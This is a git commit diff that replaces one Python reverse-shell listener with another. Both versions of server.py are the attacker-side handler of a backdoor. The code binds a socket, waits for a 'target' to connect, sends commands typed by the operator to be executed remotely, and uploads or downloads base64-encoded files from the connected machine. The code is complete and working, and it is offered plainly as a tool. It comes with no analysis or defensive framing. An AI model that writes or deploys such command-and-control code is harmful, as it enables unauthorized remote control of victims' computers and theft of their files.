add4a313bd6bffd83a46b1bf3a1c191a6b38cb56
revolt36 <141328183+revolt36@users.noreply.github.com>
2023-10-10 15:21:59 +0400

    Update server.py

--- server.py
+++ server.py
@@ -1,70 +1,65 @@
 import socket
-import json
-import os
-import subprocess
+import base64
+import simplejson
+import time
 
+class SocketListener:
+    def __init__(self,ip,port):
+        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        my_listener.bind((ip, port))
+        my_listener.listen(0)
+        print("Listening...")
+        (self.my_connection, my_address) = my_listener.accept()
+        print("Connection OK from " + str(my_address))            
 
-def reliable_send(data):
-	jsondata = json.dumps(data)
-	target.send(jsondata.encode())
+    def json_send(self,data):
+        json_data = simplejson.dumps(data)
+        self.my_connection.send(json_data.encode("utf-8"))
 
-def reliable_recv():
-	data = ''
-	while True:
-		try:
-			data = data + target.recv(1024).decode().rstrip()
-			# data = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
-			return json.loads(data)
-		except ValueError:
-			continue
+    def json_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.my_connection.recv(1024).decode()
+                return simplejson.loads(json_data)
+            except ValueError:
+                continue
 
-def upload_file(file_name):
-        f = open(file_name, 'rb')
-        target.send(f.read())
+    def command_execution(self, command_input):
+        self.json_send(command_input)
 
+        if command_input[0] == "quit":
+            self.my_connection.close()
+            exit()
 
-def download_file(file_name):
-	f = open(file_name, 'wb')
-	target.settimeout(1)
-	chunk = target.recv(1024)
-	while chunk:
-		f.write(chunk)
-		try:
-			chunk = target.recv(1024)
-		except socket.timeout as e:
-			break
-	target.settimeout(None)
-	f.close()
+        return self.json_receive()
 
-def target_communication():
-	while True:
-		command = input('* Shell~%s: ' % str(ip))
-		reliable_send(command)
-		if command == 'quit':
-			break
-		elif command == 'clear':
-			os.system('clear')
-		elif command[:3] == 'cd ':
-			pass
-		elif command == 'ss':
-			pass
-		elif command[:8] == 'download':
-			download_file(command[9:])
-		elif command[:6] == 'upload':
-			upload_file(command[7:])
-		elif command == False:
-			continue
-		else:
-			result = reliable_recv()
-			print(result)
+    def save_file(self,path,content):
+        with open(path,"wb") as my_file:
+            my_file.write(base64.b64decode(content))
+            return "Download OK"
 
-your_ip = input("Enter your ip address: ")
-connection_port = int(input("Enter connection port: "))
+    def get_file_content(self,path):
+        with open(path,"rb") as my_file:
+            return base64.b64encode(my_file.read())
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind((your_ip, connection_port))
-print('[+] Listening For The Incoming Connections')
-sock.listen(5)
-target, ip = sock.accept()
-print('[+] Target Connected From: ' + str(ip))
-target_communication()
+    def start_listener(self):
+        while True:
+            command_input = input("Enter command: ")
+            command_input = command_input.split(" ")
+            try:
+                if command_input[0] == "upload":
+                    my_file_content = self.get_file_content(command_input[1])
+                    command_input.append(my_file_content)
+
+                command_output = self.command_execution(command_input)
+
+                if command_input[0] == "download" and "Error!" not in command_output:
+                    command_output = self.save_file(command_input[1],command_output)
+            except Exception:
+                command_output = "Error"
+            print(command_output)
+
+my_socket_listener = SocketListener("0.0.0.0",8080)
+my_socket_listener.start_listener()
